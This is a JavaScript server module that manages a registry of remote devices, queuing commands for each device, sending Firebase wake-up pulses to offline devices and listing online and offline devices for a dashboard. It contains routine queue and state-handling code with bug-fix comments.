/**
 * Device store and selection logic
 */

const { normalizeDeviceId } = require("../utils/device");
const { wakeDevice } = require("../services/firebaseService");

const fs = require("fs");
const path = require("path");

/** @type {Map<string, any>} */
const devices = new Map();
const pendingCommands = new Map(); // deviceId -> [{cmd, timestamp}]
const pendingCommandClaims = new Map(); // deviceId -> { commands, claimedAt, generation }
const sessionStates = new Map(); // deviceId -> last known state
const offlineStats = new Map(); // deviceId -> { lastSeen: timestamp }
const offlineFcmTokens = new Map(); // deviceId -> fcmToken (persisted across disconnects)

let currentDeviceId = null;

function setCurrentDeviceId(deviceId) {
  currentDeviceId = deviceId || null;
}

function getCurrentDeviceId() {
  return currentDeviceId;
}

function addDevice(deviceId, device) {
  const normalized = normalizeDeviceId(deviceId);
  // Guarantee the health object has our new properties defined immediately on connection
  if (device && device.health) {
    if (typeof device.health.networkLocked === 'undefined') device.health.networkLocked = false;
    if (typeof device.health.appLocked === 'undefined') device.health.appLocked = false;
    if (typeof device.health.gainLevel === 'undefined') device.health.gainLevel = 1.0;
  }
  devices.set(normalized, device);
  currentDeviceId = normalized;
  // Restore FCM token from offline cache if the device reconnects
  if (!device.fcmToken && offlineFcmTokens.has(normalized)) {
    device.fcmToken = offlineFcmTokens.get(normalized);
  }
  return normalized;
}

function getDevice(deviceId) {
  return devices.get(normalizeDeviceId(deviceId));
}

function hasDevice(deviceId) {
  return devices.has(normalizeDeviceId(deviceId));
}

function isOnline(deviceId) {
  return devices.has(normalizeDeviceId(deviceId));
}

function getOfflineStats(deviceId) {
  return offlineStats.get(normalizeDeviceId(deviceId)) || null;
}

function removeDevice(deviceId) {
  const normalized = normalizeDeviceId(deviceId);
  if (devices.has(normalized)) {
    // Persist FCM token so we can still wake the device after it disconnects
    const dev = devices.get(normalized);
    if (dev?.fcmToken) {
      offlineFcmTokens.set(normalized, dev.fcmToken);
    }
    offlineStats.set(normalized, { 
      lastSeen: Date.now(),
      model: dev.model || "Unknown Device"
    });
  }
  devices.delete(normalized);
  if (currentDeviceId === normalized) {
    currentDeviceId = devices.size > 0 ? devices.keys().next().value : null;
  }
}

// ── Layer 9 & 10: Command Queue & Session Restore ──

function queueCommand(deviceId, command) {
  const norm = normalizeDeviceId(deviceId);
  if (!pendingCommands.has(norm)) {
    pendingCommands.set(norm, []);
  }
  const queue = pendingCommands.get(norm);
  queue.push({ command, ts: Date.now() });
  
  // Bug Fix: Prevent infinite memory leak if offline device is spammed with commands
  const maxPendingCommands = 100;
  if (queue.length > maxPendingCommands) {
    queue.shift();
  }

  // ── Ghost Node: Auto-Wake on Command ──
  // Since we removed KeepAliveWorker, the device won't check the queue unless it wakes up.
  // Fire a pulse whenever a command is queued to ensure the device pulls the command.
  const dev = devices.get(norm);
  const fcmToken = dev?.fcmToken || offlineFcmTokens.get(norm);
  
  if (fcmToken) {
    // Fire and forget - don't block the command queue
    console.log(`📡 Queued command for ${norm}. Firing FCM Wakeup pulse...`);
    wakeDevice(fcmToken).catch(() => {});
  }
}

function popQueuedCommands(deviceId) {
  const norm = normalizeDeviceId(deviceId);
  const now = Date.now();
  const claim = pendingCommandClaims.get(norm);

  // S-M3 fix: Reduced idempotency window from 2s to 500ms.
  // The 2s window caused command loss: rapid device reconnect → re-sync within 2s
  // → replayed=true → device skips commands → commands silently dropped.
  if (claim && now - claim.claimedAt <= 500) {
    return {
      commands: claim.commands.map((c) => c.command),
      generation: claim.generation,
      replayed: true,
    };
  }

  const commands = pendingCommands.get(norm) || [];
  pendingCommands.delete(norm);

  const generation = now;
  pendingCommandClaims.set(norm, { commands, claimedAt: now, generation });
  setTimeout(() => {
    const active = pendingCommandClaims.get(norm);
    if (active && active.generation === generation) {
      pendingCommandClaims.delete(norm);
    }
  }, 500);

  return {
    commands: commands.map((c) => c.command),
    generation,
    replayed: false,
  };
}

function peekQueuedCommands(deviceId) {
  const norm = normalizeDeviceId(deviceId);
  const commands = pendingCommands.get(norm) || [];
  return commands.map((c) => c.command);
}

function queuedCommandCount(deviceId) {
  const norm = normalizeDeviceId(deviceId);
  return (pendingCommands.get(norm) || []).length;
}

function saveSessionState(deviceId, stateObj) {
  const norm = normalizeDeviceId(deviceId);
  const existing = sessionStates.get(norm) || {};
  sessionStates.set(norm, { ...existing, ...stateObj });
}

function getSessionState(deviceId) {
  return sessionStates.get(normalizeDeviceId(deviceId)) || {};
}

function updateHeartbeat(deviceId) {
  const norm = normalizeDeviceId(deviceId);
  offlineStats.set(norm, { lastSeen: Date.now() });
}

function listDevices() {
  const list = [];
  
  // 1. Add all currently online devices
  devices.forEach((dev, id) => {
    list.push({
      deviceId: id,
      online: true, // Tell React this device is live
      model: dev.model,
      sdk: dev.sdk,
      appVersionName: dev.appVersionName || "",
      appVersionCode: Number(dev.appVersionCode || 0),
      connectedAt: dev.connectedAt,
      health: dev.health,
    });
  });

  // 2. SENIOR DEV FIX: Add historical offline devices
  // This allows the dashboard to render offline devices so you can click them and send a Wake pulse.
  offlineFcmTokens.forEach((fcmToken, id) => {
    if (!devices.has(id)) {
      const stats = offlineStats.get(id);
      list.push({
        deviceId: id,
        online: false, // Tell React this device is dead
        lastSeen: stats ? stats.lastSeen : null,
        model: stats ? stats.model : "Offline Device",
        health: { wsConnected: false }
      });
    }
  });

  return list;
}

function findDevice(requestedId) {
  const normalized = normalizeDeviceId(requestedId);

  if (normalized && devices.has(normalized)) {
    return { id: normalized, device: devices.get(normalized) };
  }

  return null;
}

function forEachDevice(callback) {
  devices.forEach(callback);
}

function size() {
  return devices.size;
}

/**
 * Return all offline devices that have a stored FCM token.
 * Used by dashboardController to fire wakeup pulses.
 */
function getOfflineFcmTokens() {
  const results = [];
  offlineFcmTokens.forEach((fcmToken, deviceId) => {
    if (!devices.has(deviceId)) {
      results.push({ deviceId, fcmToken });
    }
  });
  return results;
}

module.exports = {
  addDevice,
  getDevice,
  hasDevice,
  removeDevice,
  listDevices,
  findDevice,
  forEachDevice,
  size,
  setCurrentDeviceId,
  getCurrentDeviceId,
  devices,
  queueCommand,
  popQueuedCommands,
  peekQueuedCommands,
  queuedCommandCount,
  saveSessionState,
  getSessionState,
  isOnline,
  getOfflineStats,
  updateHeartbeat,
  getOfflineFcmTokens,
};
